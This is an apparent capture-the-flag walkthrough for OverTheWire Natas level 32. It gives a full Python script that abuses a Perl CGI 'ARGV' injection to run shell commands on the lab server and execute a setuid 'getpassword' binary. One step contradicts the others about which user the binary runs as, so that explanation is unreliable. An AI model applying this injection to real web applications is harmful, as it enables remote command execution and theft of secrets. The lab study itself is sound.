> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas32.natas.labs.overthewire.org`                  |
| Username | `natas32`                                                    |
| Password | *found in [Natas Level 30 → 31](natas-level-30-level-31.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own Perl source
- **Python** — to execute commands via the same `ARGV` injection as Level 31

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas32.natas.labs.overthewire.org` and log in with the password from Level 31.

The page is identical to Level 31, a CSV upload form, except for one line in the form: **"There is a binary in the webroot that you need to execute."** The source also credits Netanel Rubin, the researcher behind the Perl Jam 2 talk this attack is drawn from. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

The source is byte-for-byte identical to Level 31 — same `upload()` check, same `param('file')`, same `while (<$file>)` loop, same `split /,/` and `escapeHTML` per cell, except the form hint text and a comment crediting Netanel Rubin. The vulnerability and the exploit path are identical: `$cgi->upload('file')` passes with a real file present, `$cgi->param('file')` returns `ARGV` first when it is submitted before the real file, and `while (<$file>)` reads from whatever `@ARGV` contains, populated from the query string.

The only difference is where the password is. It is not readable directly from `/etc/natas_webpass/natas33`. A `getpassword` binary in the webroot must be executed to obtain it.

---

### Step 3 — Locate the Binary

Use the existing RCE (Remote Code Execution) channel to list the webroot:

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas32", "<password>")
url  = "http://natas32.natas.labs.overthewire.org/index.pl"

def run(cmd):
    return requests.post(
        url + "?" + cmd + " |",
        auth=auth,
        files=[("file", ("dummy.csv", "a,b\n1,2\n"))],
        data={"file": "ARGV"}
    )

print(run("ls -al .").text)
```

The response confirms `getpassword` is present and reveals something critical about its permissions:

```
-rwsrwx--- 1 root natas32 16096 Apr 3 15:08 getpassword
```

The `s` in the owner execute position is the **setuid bit**. When any process executes this binary, it runs with the effective UID of the file's owner, `root`, regardless of who invoked it. `/etc/natas_webpass/natas33` is only readable by root; the web process cannot read it directly. `getpassword` is the controlled escalation path: the web process (running as natas32) is permitted to execute it, and it runs as root and performs the read internally.

---

### Step 4 — Execute the Binary

```python
print(run("./getpassword").text)
```

The binary runs as the web process, which has read access to `/etc/natas_webpass/natas33`. Its output — the password — is streamed through `@ARGV` into `while (<$file>)` and printed in the response table.

Full script:

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas32", "<password>")
url  = "http://natas32.natas.labs.overthewire.org/index.pl"

def run(cmd):
    return requests.post(
        url + "?" + cmd + " |",
        auth=auth,
        files=[("file", ("dummy.csv", "a,b\n1,2\n"))],
        data={"file": "ARGV"}
    )

print(run("ls -al .").text)       # confirm getpassword exists
print(run("./getpassword").text)  # execute it
```

```bash
python3 natas32.py
```

The password for natas33 appears in a table cell in the response.

That is the password for [Natas Level 32 → 33](natas-level-32-level-33.md).

---

## Key Takeaways

- **The vulnerability is identical to Level 31.** The source code is the same. The only change is in the path to the secret — a binary that must be discovered and executed rather than a file that can be read directly. Recognising a known pattern and adapting the payload is the whole challenge.
- **`ls` before executing unknown binaries.** The hint says "getpassword" but gives no path. Listing the webroot with the RCE channel first confirms the binary name, location, and permissions before attempting to run it.
- **`getpassword` uses the setuid bit, not open permissions.** The binary is owned by root with the setuid bit set (`-rwsrwx---`). It runs as root regardless of who executes it. The password file for natas33 is only readable by root; the web process cannot read it directly. The binary is the intentional, controlled escalation path — execute it through the RCE channel and it performs the privileged read internally.

---